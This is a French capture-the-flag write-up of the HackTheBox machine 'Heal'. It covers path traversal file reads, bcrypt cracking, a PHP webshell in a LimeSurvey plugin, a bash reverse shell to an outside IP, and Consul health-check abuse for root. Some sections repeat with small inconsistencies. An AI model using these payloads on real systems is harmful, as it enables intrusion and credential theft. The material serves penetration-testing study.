![Cover](cover.png)

### 1. Reconnaissance & Énumération des Services

Ma phase de reconnaissance commence par un scan **Nmap** classique pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.46

# Scan de détection de services et scripts par défaut
nmap -p 22,80 -sCV 10.10.11.46
```

Le scan révèle deux ports : **22 (SSH)** et **80 (HTTP)**. Le serveur Web **Nginx** redirige vers `http://heal.htb/`. J'ajoute cette entrée à mon fichier `/etc/hosts`. L'empreinte du service (OpenSSH 8.9p1, Nginx 1.18.0) suggère une distribution **Ubuntu 22.04 (Jammy)**.

#### Énumération des VHosts
Compte tenu de la nature de la machine, je procède à un **Fuzzing** de sous-domaines avec **ffuf** pour découvrir d'éventuels points d'entrée isolés.

```bash
ffuf -u http://10.10.11.46 -H "Host: FUZZ.heal.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Je découvre deux sous-domaines supplémentaires :
*   `api.heal.htb` : Une API backend.
*   `take-survey.heal.htb` : Une instance **LimeSurvey**.

### 2. Analyse des Vecteurs d'Attaque Web

L'application principale sur `heal.htb` est un générateur de CV utilisant le framework **Express**. Une fonctionnalité attire mon attention : "Export as PDF". L'analyse des métadonnées du PDF généré via **exiftool** montre l'utilisation de **wkhtmltopdf 0.12.6**.

#### Analyse de l'API (api.heal.htb)
En interceptant le trafic avec **Burp Suite**, j'observe les interactions entre le frontend et l'API. L'API semble être développée avec **Ruby on Rails** (présence du header `X-Runtime`).
Les endpoints identifiés sont :
*   `POST /signin` : Authentification (JWT).
*   `POST /exports` : Envoi du contenu HTML pour conversion PDF.
*   `GET /download?filename=<name>` : Récupération du fichier généré.

### 3. Exploitation de la vulnérabilité Path Traversal

L'endpoint `/download` est un candidat idéal pour une vulnérabilité de type **Path Traversal** / **Arbitrary File Read**. Je teste l'accès aux fichiers système.

```bash
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../../../etc/passwd"
```

La lecture réussit, confirmant la vulnérabilité. Je peux désormais énumérer la configuration de l'application Rails. Je cible le fichier `config/database.yml` pour identifier la base de données.

> **Schéma Mental : De la lecture de fichier à l'exfiltration de base de données**
> 1. Identifier un paramètre contrôlé par l'utilisateur utilisé dans une fonction de lecture de fichier (`filename`).
> 2. Utiliser des séquences `../` pour sortir du répertoire `exports`.
> 3. Lire les fichiers de configuration (`database.yml`) pour localiser les fichiers de données.
> 4. Télécharger les fichiers de base de données SQLite pour une analyse hors-ligne.

Le fichier `database.yml` pointe vers `storage/development.sqlite3`. Je télécharge ce fichier via le même vecteur.

```bash
curl --path-as-is -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../storage/development.sqlite3" --output development.sqlite3
```

### 4. Extraction de Credentials & Mouvement Latéral

J'analyse la base SQLite localement pour extraire les condensats de mots de passe (**Hashes**).

```bash
sqlite3 development.sqlite3 "SELECT username, password_digest FROM users;"
# Résultat : ralph | $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```

Le hash est au format **bcrypt** (ID 3200). Je lance **hashcat** avec la liste `rockyou.txt`.

```bash
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt
```

Le mot de passe identifié est `147258369`. Bien que ce mot de passe ne fonctionne pas pour SSH, il me permet d'accéder à l'interface d'administration de **LimeSurvey** sur `take-survey.heal.htb`, confirmant une politique de **Password Reuse**.

### 5. Brèche Initiale : LimeSurvey RCE

L'instance **LimeSurvey** (v6.6.4) permet aux administrateurs d'installer des **Plugins**. C'est un vecteur classique pour obtenir une **Remote Code Execution (RCE)**.

#### Création du Plugin Malveillant
Un plugin LimeSurvey nécessite au minimum un fichier PHP et un fichier `config.xml`. Je prépare un **Webshell** simple.

```php
// 0xdf.php
<?php system($_REQUEST['cmd']); ?>
```

Je crée une archive ZIP contenant `0xdf.php` et un `config.xml` valide (basé sur la documentation officielle). Une fois le plugin "uploadé" et installé via le panneau d'administration, il est accessible dans le répertoire des uploads.

#### Exécution du Reverse Shell
Je localise le point d'entrée du plugin dans `/upload/plugins/ExampleSettings/0xdf.php`. Je déclenche un **Reverse Shell** Bash.

```bash
# Listener
nc -lnvp 443

# Payload URL-encoded
curl -G "http://take-survey.heal.htb/upload/plugins/ExampleSettings/0xdf.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"
```

Je reçois une connexion entrante : je suis désormais `www-data` sur la machine **Heal**.

```bash
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Énumération Post-Exploitation & Accès Initial

Une fois l'accès à l'API obtenu, j'exploite un **Path Traversal** identifié sur l'endpoint `/download`. Cette vulnérabilité me permet de lire des fichiers sensibles et de récupérer la configuration de l'application **Ruby on Rails**.

```bash
# Lecture de /etc/passwd pour identifier les utilisateurs
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../../../etc/passwd"

# Récupération de la configuration de la base de données
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../config/database.yml"

# Téléchargement de la base SQLite3 de développement
curl -s -H "Authorization: Bearer <JWT>" "http://api.heal.htb/download?filename=../../storage/development.sqlite3" --output dev.sqlite3
```

L'analyse de la table `users` dans la base **SQLite3** révèle le hash **bcrypt** de l'administrateur `ralph`.

```bash
sqlite3 dev.sqlite3 "SELECT username, password_digest FROM users;"
# ralph | $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG

# Crack du hash via Hashcat (Mode 3200)
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt
# Résultat : 147258369
```

### Mouvement Latéral : De l'API à LimeSurvey

Le mot de passe de `ralph` est réutilisé sur l'instance **LimeSurvey** (`take-survey.heal.htb`). En tant qu'administrateur, je peux abuser du système de **Plugins** pour obtenir une **Remote Code Execution (RCE)**.

> **Schéma Mental : RCE via Plugin**
> 1. **Contrainte** : Le système attend un fichier `.zip` contenant un fichier `config.xml` valide.
> 2. **Payload** : Inclure un fichier PHP malveillant (`webshell.php`) dans l'archive.
> 3. **Exécution** : Le serveur décompresse l'archive dans `/upload/plugins/`. L'accès direct au fichier PHP déclenche l'exécution côté serveur.

```bash
# Préparation du plugin malveillant
echo '<?php system($_REQUEST["cmd"]); ?>' > 0xdf.php
# Ajout d'un config.xml légitime (récupéré de la doc LimeSurvey)
zip exploit.zip 0xdf.php config.xml
```

Après l'upload et l'activation du plugin, j'obtiens un **Reverse Shell** en tant que `www-data`.

```bash
# Trigger du shell
curl "http://take-survey.heal.htb/upload/plugins/0xdf/0xdf.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261'"
```

### Escalade de Privilèges : Vers l'utilisateur `ron`

L'énumération interne des fichiers de configuration de **LimeSurvey** (`application/config/config.php`) révèle des identifiants pour une base de données **PostgreSQL**.

```php
'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;'
```

Je teste ce mot de passe par **Password Spraying** sur les utilisateurs système identifiés dans `/etc/passwd` (`ralph`, `ron`, `postgres`).

```bash
netexec ssh 10.10.11.46 -u users.txt -p 'AdmiDi0_pA$$w0rd'
# [+] ron:AdmiDi0_pA$$w0rd Linux - Shell access!
```

### Escalade de Privilèges Root : Abus de Consul

En tant que `ron`, j'identifie un service **Consul** tournant avec les privilèges `root`. Le fichier de configuration `/etc/consul.d/config.json` indique que les **Script Checks** sont activés (`"enable_script_checks": true`) et que la politique ACL par défaut est permissive (`"acl_default_policy": "allow"`).

> **Schéma Mental : Privilege Escalation via Consul**
> Consul permet de définir des "Health Checks" qui exécutent des commandes pour vérifier l'état d'un service. Puisque l'agent tourne en `root` et qu'aucune authentification n'est requise sur l'API locale (port 8500), je peux enregistrer un nouveau service dont le "check" est une commande arbitraire.

```bash
# Création du payload de service (0xdf.json)
{
  "Name": "pwn-service",
  "ID": "pwn",
  "Check": {
    "args": ["bash", "-c", "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"],
    "interval": "10s"
  }
}

# Enregistrement du service via l'API REST locale
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -d @0xdf.json
```

Une fois le délai de l'intervalle écoulé, le binaire **SUID** est créé dans `/tmp`.

```bash
# Obtention du shell root
/tmp/rootbash -p
whoami # root
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l'accès initial obtenu en tant que `www-data` et la migration vers l'utilisateur `ron` effectuée grâce à la réutilisation de mot de passe trouvée dans la configuration **PostgreSQL** de **LimeSurvey**, mon objectif est d'atteindre les privilèges `root`.

#### Énumération du vecteur Consul

L'énumération des processus révèle une instance de **Consul** s'exécutant avec les privilèges `root`. L'examen des ports locaux via `netstat` confirme la présence des ports standards de **Consul**, notamment le port **8500** (**HTTP API**).

```bash
# Identification du processus Consul
ps auxww | grep consul
# Analyse de la configuration
cat /etc/consul.d/config.json
```

Le fichier de configuration `/etc/consul.d/config.json` contient deux directives critiques :
1.  `"enable_script_checks": true` : Autorise l'exécution de scripts arbitraires pour les **Health Checks**.
2.  `"acl_default_policy": "allow"` : Indique qu'aucune authentification n'est requise pour interagir avec l'**API**.

> **Schéma Mental : Exploitation de Consul Service Registration**
> Consul permet d'enregistrer des services via son **API REST**. Si les **Script Checks** sont activés et que l'**ACL** est permissive, un attaquant peut enregistrer un service factice associé à un **Health Check**. Ce check exécute une commande système à intervalle régulier avec les privilèges du processus **Consul** (ici `root`).

#### Exploitation : RCE via Service Registration

Je crée une charge utile au format **JSON** pour enregistrer un nouveau service. Le but est de créer une copie **SUID** de `/bin/bash` dans `/tmp`.

```json
{
  "Name": "pwn-service",
  "ID": "pwn-check",
  "Port": 0,
  "Check": {
      "args": ["bash", "-c", "cp /bin/bash /tmp/pwn && chmod 6777 /tmp/pwn"],
      "interval": "10s",
      "timeout": "5s"
  }
}
```

J'utilise `curl` pour envoyer cette configuration à l'**API** locale :

```bash
# Enregistrement du service malveillant
curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -H "Content-Type: application/json" -d @exploit.json

# Attente du déclenchement du Health Check et exécution du binaire SUID
/tmp/pwn -p
```

L'exécution avec l'option `-p` permet de conserver les privilèges effectifs, m'octroyant un shell `root` complet.

---

### Analyse Post-Exploitation : Beyond Root

L'analyse approfondie de la machine révèle une protection intéressante contre une vulnérabilité **SSRF** (Server-Side Request Forgery) connue sur **wkhtmltopdf** (CVE-2023-35583).

#### Le vecteur SSRF neutralisé
Le composant de génération de PDF utilise **wkhtmltopdf 0.12.6**. Normalement, l'injection d'une balise `<iframe src="http://10.10.14.6">` dans le contenu HTML envoyé à l'**API** devrait forcer le serveur à effectuer une requête vers mon IP. Cependant, l'application restait muette.

L'analyse du code source Ruby dans `/home/ralph/resume_api/app/controllers/exports_controller.rb` explique ce comportement :

```ruby
command = "wkhtmltopdf --proxy None --user-style-sheet #{css_path} - #{filepath}"
```

L'utilisation de l'option `--proxy None` agit comme une mesure de durcissement (Hardening). En forçant un proxy inexistant nommé "None", **wkhtmltopdf** tente de résoudre ce nom via **DNS**. La résolution échoue, ce qui interrompt toute tentative de connexion réseau sortante initiée par le moteur de rendu, neutralisant ainsi l'**SSRF**.

#### Vérification de la mitigation
Pour confirmer cette analyse, j'ai modifié le code source pour supprimer l'option `--proxy None` et redémarré le service `run_api`. Après cette modification, l'injection d'**iframe** est devenue fonctionnelle, confirmant que la vulnérabilité était présente mais volontairement bridée par une configuration spécifique de la ligne de commande.

Cette technique de "Proxy None" est une méthode pragmatique pour limiter l'exposition réseau d'outils de rendu HTML sans modifier le binaire lui-même.